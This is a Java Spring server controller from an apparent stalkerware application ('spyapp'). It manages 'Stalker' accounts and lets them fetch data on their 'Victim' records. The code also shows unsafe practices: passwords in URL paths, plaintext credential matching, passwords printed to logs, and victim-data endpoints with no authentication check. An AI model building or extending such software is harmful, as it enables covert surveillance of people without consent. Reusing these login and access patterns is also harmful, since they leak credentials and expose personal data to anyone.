/*
 * Copyright (c) 2018. AK
 */

package com.spyapp.server.core.beans.controlers;


import com.spyapp.server.core.beans.entities.Stalker;
import com.spyapp.server.core.beans.entities.Victim;
import com.spyapp.server.core.beans.repositories.StalkerRepository;
import com.spyapp.server.core.beans.repositories.VictimRepository;
import com.spyapp.server.core.beans.services.LoginService;
import com.spyapp.server.requestresponsemodel.request.LoginRequest;
import com.spyapp.server.requestresponsemodel.request.VictimRequest;
import com.spyapp.server.requestresponsemodel.response.stalkerresponses.LoginResponse;
import com.spyapp.server.util.RandomStringGenerator;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.util.LinkedList;

@Controller
@RequestMapping("/stalker")
public class StalkerController {

    @Autowired
    private StalkerRepository stalkerRepository;

    @Autowired
    private LoginService loginService;

    @Autowired
    private VictimRepository victimRepository;

    private Logger logger = LoggerFactory.getLogger(StalkerController.class);


    /**
     * Allows to add stalker
     * @param stalker JSON
     * @return
     */
    @PostMapping(value = "/addStalker", produces = "application/json")
    public ResponseEntity<Stalker> addStalker(@RequestBody Stalker stalker) {

        return new ResponseEntity<>(stalkerRepository.save(stalker), HttpStatus.ACCEPTED);
    }

    /**
     * Legacy way of logging in
     * @param username name of stalker
     * @param password password of stalker
     * @param response Http response
     * @param request Http request
     * @return
     */
    @GetMapping(value = "getStalker/{username}/{password}", produces = "application/json")
    public ResponseEntity<LoginResponse> login(@PathVariable("username") String username, @PathVariable("password") String password,
                                               HttpServletResponse response, HttpServletRequest request) {


        if (isCookieValid(request.getCookies())) {
            System.out.println("VALID COOKIE");
            return new ResponseEntity<LoginResponse>(new LoginResponse(true), HttpStatus.ACCEPTED);
        }

        if (stalkerExists(username, password, response)) {
            return new ResponseEntity<LoginResponse>(new LoginResponse(true), HttpStatus.ACCEPTED);
        } else {
            return new ResponseEntity<LoginResponse>(new LoginResponse(false), HttpStatus.FORBIDDEN);
        }
    }

    /**
     * New way of logging in (by POST)
     * @param request JSON of LoginRequest
     * @param httpServletRequest HTTP request
     * @param httpServletResponse HTTP response
     * @return
     */
    @PostMapping(value = "getStalker", produces = "application/json")
    public ResponseEntity<LoginResponse> loginPost(@RequestBody LoginRequest request, HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) {


        System.out.println(request.getUsername() + " " + request.getPassword());

        if (httpServletRequest.getCookies() != null) {
            if (isCookieValid(httpServletRequest.getCookies())) {
                return new ResponseEntity<LoginResponse>(new LoginResponse(true), HttpStatus.ACCEPTED);
            }
        }
        if (stalkerExists(request.getUsername(), request.getPassword(), httpServletResponse)) {
            return new ResponseEntity<LoginResponse>(new LoginResponse(true), HttpStatus.ACCEPTED);
        } else {
            return new ResponseEntity<LoginResponse>(new LoginResponse(false), HttpStatus.FORBIDDEN);
        }
    }

    /**
     * Utility method, checks whether Stalker exists
     * @param username name of Stalker
     * @param password password of Stalker
     * @param response HTTP response
     * @return
     */
    private boolean stalkerExists(String username, String password, HttpServletResponse response) {

        LinkedList<Stalker> stalkers = stalkerRepository.findByUsernameAndPassword(username, password);

        System.out.println(username + " " + password);
        if (stalkers.size() > 0) {

            String key = RandomStringGenerator.getInstance().getHashID(20);

            Cookie cookie = new Cookie("sesionid", key);
            cookie.setMaxAge(1000 * 60 * 60 * 24 * 7);

            loginService.save(username, cookie);

            response.addCookie(cookie);

            return true;
        } else {
            return false;
        }
    }

    /**
     * Checks whether cookie is valid
     * @param cookies array of cookies
     * @return
     */
    private boolean isCookieValid(Cookie[] cookies) {

        for (Cookie cookie : cookies) {

            if (cookie.getName().equals("sesionid")) {
                if (loginService.checkIfValid(cookie.getValue())) {
                    System.out.println(cookie.getValue());
                    return true;
                }

            }
        }

        return false;
    }

    /**
     * Allows to get victim
     * @param request JSON of VictimRequest
     * @param httpServletRequest HTTP request
     * @param httpServletResponse HTTP response
     * @return
     */
    @PostMapping(value = "getVictim", produces = "application/json")
    public ResponseEntity<Victim> getVictim(@RequestBody VictimRequest request, HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) {

        Stalker stalker = stalkerRepository.findByUsername(request.getStalkerName()).get();

        Victim victim = victimRepository.findVictimByStalkerAndName(stalker, request.getVictimName()).get();
        if (victim != null) {
            return new ResponseEntity<Victim>(victim, HttpStatus.ACCEPTED);
        } else {
            return new ResponseEntity<Victim>(victim, HttpStatus.NOT_ACCEPTABLE);
        }
    }

    /**
     * Allows to get all Victims of Stalker with name stalkerName
     * @param stalkerName name of Stalker
     * @return
     */
    @GetMapping(value = "getAllVictims/{stalkerName}")
    public ResponseEntity<LinkedList<Victim>> getAllVictims(@PathVariable String stalkerName) {

        Stalker stalker = stalkerRepository.findByUsername(stalkerName).get();

        return new ResponseEntity<LinkedList<Victim>>(victimRepository.findVictimByStalker(stalker), HttpStatus.ACCEPTED);
    }
}
